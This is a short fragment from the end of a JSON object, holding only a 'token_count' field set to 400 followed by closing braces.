        "token_count": 400
    }
}